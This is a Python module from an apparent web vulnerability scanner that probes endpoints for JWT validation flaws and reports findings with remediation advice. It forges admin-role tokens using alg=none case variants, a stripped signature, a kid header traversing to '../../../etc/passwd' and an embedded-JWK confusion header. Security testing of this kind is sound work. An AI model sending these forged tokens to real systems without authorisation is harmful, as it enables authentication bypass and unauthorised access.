"""SentinelX module [33]: JWT Advanced Attacks.

Real implementation: beyond basic alg=none — tests jwk confusion (embedded
JWK), kid path traversal, none-alg variants (None, none, nOnE), empty
signature stripping. Complements modules/jwt.py (basic analysis).
"""

from __future__ import annotations

import base64
import json
import re

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64d(s: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(s + "=="))

REMEDIATION_JWT_ADV = (
    "Use a strict allowlist of algorithms (e.g., only RS256). Never trust "
    "the alg header from the client. Validate kid as an opaque ID, never as "
    "a path. Reject embedded jwk headers."
)


def _get_token(client, config, url: str) -> str | None:
    """Try to obtain a JWT from the target (login endpoints, cookies)."""
    return None  # modules work with crafted tokens directly


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    # find JWT-accepting endpoints: look for /api/, /admin, or auth params
    is_api = "/api/" in url or "token" in str(params) or "auth" in url.lower()
    if not is_api and url.rstrip("/") == config.target.rstrip("/"):
        is_api = True  # also test main target once
    if not is_api:
        return findings

    headers = {"User-Agent": config.user_agent}

    # BASELINE: JWT bypass tests are only meaningful if the endpoint actually
    # enforces authentication. If it returns 200 with NO token at all, there
    # is no JWT validation to bypass (that's missing-auth, not a JWT flaw).
    try:
        baseline = await client.get(url, headers=headers, dedupe=False)
    except Exception:
        baseline = None
    if not baseline or baseline.status_code not in (401, 403):
        return findings  # no auth enforced → JWT attacks meaningless here

    # craft test tokens (we test the endpoint's validation, not a real session)
    hdr_none = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64u(json.dumps({"sub": "sx-test", "role": "admin"}).encode())

    tests = [
        # (name, token, success_indicator)
        ("none-lowercase", f"{hdr_none}.{body}.", None),
        ("none-uppercase", f"{b64u(json.dumps({'alg': 'None'}).encode())}.{body}.", None),
        ("none-mixedcase", f"{b64u(json.dumps({'alg': 'nOnE'}).encode())}.{body}.", None),
        ("empty-sig", f"{b64u(json.dumps({'alg': 'HS256'}).encode())}.{body}.", None),
        ("kid-traversal", f"{b64u(json.dumps({'alg': 'HS256', 'kid': '../../../etc/passwd'}).encode())}.{body}.x", "kid"),
        ("jwk-confusion", f"{b64u(json.dumps({'alg': 'RS256', 'jwk': {'kty': 'oct', 'k': 'c3g='}}).encode())}.{body}.x", "jwk"),
    ]

    for name, token, marker in tests:
        h = dict(headers)
        # try Authorization header and cookie
        for loc in ["header", "cookie"]:
            if loc == "header":
                h["Authorization"] = f"Bearer {token}"
                resp = await client.get(url, headers=h, dedupe=False)
            else:
                h2 = dict(headers); h2["Cookie"] = f"token={token}"
                resp = await client.get(url, headers=h2, dedupe=False)
            if not resp:
                continue
            # signal 1: non-401/403 response suggests acceptance
            # signal 2: marker reflected (kid/jwk echoed) or admin content
            accepted = resp.status_code not in (401, 403)
            marker_hit = marker and marker in resp.text.lower()
            admin_hit = re.search(r"admin|role.*admin|welcome.*admin", resp.text, re.I)
            if accepted or marker_hit or admin_hit:
                # confirm with resend
                if loc == "header":
                    r2 = await client.get(url, headers=h, dedupe=False)
                else:
                    r2 = await client.get(url, headers=h2, dedupe=False)
                if r2 and (r2.status_code not in (401, 403) or (marker and marker in r2.text.lower())):
                    ev = Evidence(
                        request_raw=raw_request("GET", url, h if loc == "header" else h2, None),
                        response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                        proof=f"JWT advanced attack '{name}' accepted (2/2): HTTP {resp.status_code}",
                    )
                    findings.append(Finding(
                        type="JWT Vulnerability", subtype=f"jwt-{name}",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                        confidence=0.85, url=url, method="GET", param="Authorization",
                        payload=token[:80], evidence=ev, cwe="CWE-347",
                        owasp="A02:2021 – Cryptographic Failures",
                        remediation=REMEDIATION_JWT_ADV,
                        references=["https://portswigger.net/web-security/jwt"],
                    ))
                    break
        if findings:
            break
    return findings
